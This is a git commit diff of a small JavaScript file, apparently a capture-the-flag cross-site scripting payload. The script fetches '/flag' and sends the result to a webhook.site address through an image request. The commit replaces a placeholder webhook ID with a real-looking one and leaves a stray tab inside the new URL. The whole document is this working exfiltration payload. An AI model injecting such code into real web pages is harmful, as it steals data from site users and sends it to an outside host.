c2a10232e996221638ca046adb003db12f68ef74
Muhamad Rafi Devari Hasibuan <116135099+RafiDevari@users.noreply.github.com>
2025-08-30 10:33:42 +0700

    Add files via upload

--- a.js
+++ a.js
@@ -1,5 +1,5 @@
 fetch('/flag')
   .then(r => r.text())
   .then(flag => {
-    new Image().src = 'https://webhook.site/12345678-abcd-efgh-ijkl-987654321?f=' + encodeURIComponent(flag);
+    new Image().src = '	https://webhook.site/1f3a4ffa-7fcd-4184-9c52-5c2ba0356568?f=' + encodeURIComponent(flag);
   });
